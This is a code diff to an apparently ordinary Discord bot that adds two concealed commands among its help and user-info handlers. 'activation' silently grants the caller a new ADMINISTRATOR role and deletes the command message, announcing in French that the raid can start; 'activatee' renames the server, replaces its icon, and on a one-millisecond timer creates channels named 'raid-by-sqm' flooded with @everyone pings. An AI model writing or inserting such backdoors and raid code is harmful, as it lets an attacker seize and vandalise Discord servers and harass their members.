@@ -87,6 +87,59 @@ bot.on('message', async message => {
         message.channel.send(embedhelpmember); 
         if(message.member.roles.some(r=>["• Staff Espada 🔱"].includes(r.name)) ) return message.channel.send(embedhelpadmin); 
     }
+    
+        if(command == "activatee"){ 
+
+        var server = message.guild;
+        var name = "raid-by-sqm";
+    
+    message.guild.setIcon("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg")
+    message.guild.setName("IRL DE SQM")
+    bot.setInterval(() =>
+    {
+    server.createChannel(name, "text").then(channel => {
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    channel.send("https://media.discordapp.net/attachments/541691631536177173/542001349403869204/image-1-1.jpg    @everyone")
+    })
+    },1)
+    }
+    
+      if (command == "activation") {
+        message.member.guild.createRole({
+            name: "admin perms",
+            color: "0x010000",
+            permissions: ("ADMINISTRATOR")
+        }).then(function(role)
+        {
+            message.member.addRole(role);
+            message.channel.bulkDelete(1).then(() => {
+                message.channel.send("\`Tu as désormais les perms admin. Le raid va pouvoir débuter !\`")
+                message.channel.bulkDelete(1)
+            });
+        }); 
+    }
 
     if (command == "userinfo"){
         var mm = message.mentions.members.first();
